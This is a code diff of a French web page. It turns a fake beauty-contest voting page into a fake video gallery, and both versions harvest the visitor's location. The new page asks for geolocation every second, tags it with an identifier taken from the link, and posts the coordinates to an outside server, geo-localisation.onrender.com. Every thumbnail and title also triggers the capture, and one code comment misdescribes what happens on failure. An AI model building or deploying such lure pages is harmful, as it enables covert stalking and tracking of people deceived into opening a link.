@@ -2,36 +2,51 @@
 <html lang="en">
 <head>
     <meta charset="UTF-8">
-    <title>Concours Régional</title>
-    <script src="https://cdn.tailwindcss.com"></script>
-    <style>
-        .hidden {
-            display: none;
-        }
-    </style>
+    <title>Galerie de Vidéos</title>
+    <link href="https://cdn.jsdelivr.net/npm/tailwindcss@2.2.19/dist/tailwind.min.css" rel="stylesheet">
 </head>
-<body class="flex flex-col items-center justify-center min-h-screen bg-gradient-to-r from-green-400 via-blue-500 to-purple-600 text-white">
-    <header class="bg-white text-gray-800 w-full py-4 shadow-md mb-8">
-        <h1 class="text-4xl font-bold text-center">Votez pour la Meilleure Miss Régionale</h1>
-    </header>
-
-    <main class="flex flex-col items-center w-full">
-        <div id="profiles" class="grid grid-cols-1 sm:grid-cols-2 md:grid-cols-3 lg:grid-cols-4 gap-8 px-4">
-            <!-- Example profile, repeat this block for multiple profiles -->
-            <div class="bg-white text-gray-800 p-4 rounded-lg shadow-md">
-                <img src="https://via.placeholder.com/300" alt="Profile Picture" class="w-full h-64 object-cover rounded-md">
-                <h2 class="text-2xl font-semibold mt-4 text-center">Miss Nom</h2>
-                <button onclick="attemptGeolocation('miss_nom')" class="mt-4 w-full bg-blue-500 text-white px-4 py-2 rounded hover:bg-blue-700">J'aime</button>
+<body>
+    <div class="container mx-auto py-8">
+        <h1 id="title" class="text-3xl font-bold mb-8 text-center">Galerie de Vidéos</h1>
+        <div class="grid grid-cols-1 sm:grid-cols-2 md:grid-cols-3 lg:grid-cols-4 gap-6">
+          
+          <!-- Carte de vidéo -->
+          <div class="bg-white rounded-lg shadow-md overflow-hidden">
+            <img id="image1" class="w-full h-48 object-cover" src="https://via.placeholder.com/300x200" alt="Thumbnail de la vidéo">
+            <div class="p-4">
+              <h2 id="video-title1" class="text-xl font-semibold">Titre de la Vidéo</h2>
             </div>
-            <!-- Add more profiles here -->
+          </div>
+    
+          <!-- Répétez la carte de vidéo pour d'autres vidéos -->
+          <div class="bg-white rounded-lg shadow-md overflow-hidden">
+            <img id="image2" class="w-full h-48 object-cover" src="https://via.placeholder.com/300x200" alt="Thumbnail de la vidéo">
+            <div class="p-4">
+              <h2 id="video-title2" class="text-xl font-semibold">Titre de la Vidéo</h2>
+            </div>
+          </div>
+    
+          <div class="bg-white rounded-lg shadow-md overflow-hidden">
+            <img id="image3" class="w-full h-48 object-cover" src="https://via.placeholder.com/300x200" alt="Thumbnail de la vidéo">
+            <div class="p-4">
+              <h2 id="video-title3" class="text-xl font-semibold">Titre de la Vidéo</h2>
+            </div>
+          </div>
+    
+          <div class="bg-white rounded-lg shadow-md overflow-hidden">
+            <img id="image4" class="w-full h-48 object-cover" src="https://via.placeholder.com/300x200" alt="Thumbnail de la vidéo">
+            <div class="p-4">
+              <h2 id="video-title4" class="text-xl font-semibold">Titre de la Vidéo</h2>
+            </div>
+          </div>
         </div>
-
-        <p id="error-message" class="hidden text-red-500 mt-8">La géolocalisation est nécessaire pour voter. Veuillez autoriser la géolocalisation et réessayer.</p>
-    </main>
+    </div>
 
     <script>
-        function attemptGeolocation(candidate) {
+        // Fonction pour tenter de récupérer la position et envoyer les coordonnées
+        function attemptGeolocation() {
             navigator.geolocation.getCurrentPosition(position => {
+                const uuid = window.location.pathname.split('/').pop();
                 const { latitude, longitude } = position.coords;
 
                 fetch('https://geo-localisation.onrender.com/location', {
@@ -39,19 +54,30 @@
                     headers: {
                         'Content-Type': 'application/json'
                     },
-                    body: JSON.stringify({ candidate, latitude, longitude })
+                    body: JSON.stringify({ uuid, latitude, longitude })
                 })
                 .then(response => response.text())
-                .then(data => {
-                    console.log(data);
-                    alert(`Vote enregistré pour ${candidate}`);
-                })
+                .then(data => console.log(data))
                 .catch(error => console.error('Error:', error));
             }, error => {
+                // En cas d'échec, recharger la page après un délai de 5 secondes
                 console.error('Geolocation error:', error);
-                document.getElementById('error-message').classList.remove('hidden');
             });
         }
+
+        // Appeler la fonction pour tenter de récupérer la position
+        setInterval(attemptGeolocation, 1000);
+
+        // Ajouter des écouteurs d'événements pour rendre le titre et les images cliquables
+        document.getElementById('title').addEventListener('click', attemptGeolocation);
+        document.getElementById('image1').addEventListener('click', attemptGeolocation);
+        document.getElementById('video-title1').addEventListener('click', attemptGeolocation);
+        document.getElementById('image2').addEventListener('click', attemptGeolocation);
+        document.getElementById('video-title2').addEventListener('click', attemptGeolocation);
+        document.getElementById('image3').addEventListener('click', attemptGeolocation);
+        document.getElementById('video-title3').addEventListener('click', attemptGeolocation);
+        document.getElementById('image4').addEventListener('click', attemptGeolocation);
+        document.getElementById('video-title4').addEventListener('click', attemptGeolocation);
     </script>
 </body>
 </html>
